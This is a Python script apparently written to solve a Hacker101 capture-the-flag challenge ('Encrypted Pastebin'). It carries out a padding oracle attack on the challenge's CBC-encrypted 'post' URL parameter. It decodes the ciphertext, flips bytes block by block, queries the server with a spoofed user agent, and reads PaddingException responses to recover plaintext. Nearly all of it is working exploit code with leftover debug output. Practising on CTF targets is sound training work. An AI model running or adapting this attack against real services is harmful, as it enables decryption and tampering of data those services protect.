#!venv/bin/python3 
import requests
import fake_useragent
import base64
import time
import copy

url="https://753be022c7c169da44b81a773f5adcb6.ctf.hacker101.com/?post=7hHtETjfNWmHbkjKZdkBXp5OJju8D6Am8Xl5X-9MzMqa2OcrTroCRJ4u9Se01Ga81UmVKIBt194cxQwb05HC6ALyMHDfiUowj90y9Z7fzpqqA9uWaDoe2VSJEkKKlamgPAQpJqsBCBG9iroisdGYtirIDA3wpFmucHfIx4XFTG1sY!V-qnO-HRBRefAHGL!M3NcsH9K2taaj4JlqgLGO0w~~"
domain=url.split("?")[0]
params=url.split("=")[1]
ua = fake_useragent.UserAgent()
n=32

#Get the hex from the fake b64 param.
data=base64.b64decode(params.replace("~", "=").replace("-", "+").replace("!", "/"))
data=int.from_bytes(data, byteorder="big")
data=f"{data:x}"
print(data)
blocks= list(map(bytearray.fromhex, [data[i:i+n] for i in range(0, len(data), n)]))
original_block = copy.deepcopy(blocks)

def padding_correct(response):
    text = response.text
    if "Encrypted Pastebin" in text:
        return True
    elif "PaddingException" in text:
        return False
    elif "Traceback" in text:
        print("unexpected! (possible 0x01 padding now...)")
        return True 
    else:
        print(text)
        raise Exception("Weird response from the Oracle.")

def hex_to_url_b64(dump):
    #print(dump)
    return base64.b64encode(bytes.fromhex(dump)).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')

def blocks_to_dump(blocks):
    return ''.join([f"{int.from_bytes(block, byteorder='big'):032x}" for block in blocks])

def tune_padding(byte_array, block):
    padding_length = len(byte_array)
    # n^m=p {n=original block ciphered n-1, m=changed block ciphered n-1 for the padding, p=the padding}
    print("Tengo que hacerlo con" + str(padding_length))
    print(blocks[block])
    for to_change in range(padding_length):
        print(f"changing {blocks[block][16-(to_change+1)]} to be... 0x{padding_length:02x} on the +1 block.")
        print(f"The original value of the plaintex was")
        original_value = blocks[block][16-to_change-1]^original_block[block][16-to_change-1]^padding_length
        print(blocks[block][16-to_change-1],original_block[block][16-to_change-1],padding_length)
        print(blocks[block][16-to_change-1])
        print(f"Now we change it to {padding_length+1}")
        blocks[block][16-to_change-1] = original_block[block][16-to_change-1]^original_value^(padding_length+1)
        print(blocks[block][16-to_change-1])

# >3 oracle
def call_oracle(domain,payload):
    response = requests.get(f"{domain}?post={payload}", headers={"User-Agent": ua.chrome})
    return padding_correct(response) 

for block in reversed(range(1, len(blocks)-1)):
    guesses = bytearray()
    possible_bytes = bytearray() 
    for byte_position in reversed(range(16)):
        # pre
        if byte_position<15:
            tune_padding(guesses, block)
            possible_bytes=bytearray()
        for i in range(197,256):
            print(f"working with {hex(blocks[block][byte_position])}")
            blocks[block][byte_position] = i
            payload=hex_to_url_b64(blocks_to_dump(blocks))
            #response = requests.get(f"{domain}?post={payload}", headers={'User-Agent': ua.chrome})  
#            if padding_correct(response):
            if call_oracle(domain, payload):
                print(f"\033[32m[+++][====]Possible with the byte {hex(i)}[=+===+==]\033[0m")
                if byte_position == 15:
                    print(f"\033[33mWe are on the last byte, so we have to check if this byte makes the padding 0x01 or 0x02..0xFF\033[0m")
                    print(f"Previous block = {blocks[block][byte_position-1]}")
                    print(blocks[block][byte_position],blocks[block][byte_position-1])
                    blocks[block][byte_position-1]+=1
                    print(payload)
                    print(f"Previous block (updated) = {blocks[block][byte_position-1]}")
                    payload=hex_to_url_b64(blocks_to_dump(blocks))
                    print(payload)
                    if call_oracle(domain, payload):
                        print("Possible 0x01")
                    else:
                        print("Possible 0x02...0xFF")
                    print(f"checking...")
                    blocks[block][byte_position-1]-=1
                    print(blocks[block][byte_position],blocks[block][byte_position-1])
                    print("done!");
                    print(f"Previous block (end) = {blocks[block][byte_position-1]}")
                else:  
                    possible_bytes.append(i)
                print(possible_bytes)
            else:
                print(f"\033[31mTrying with byte value {i} on the {byte_position}th position of the {block}th block\033[0m")
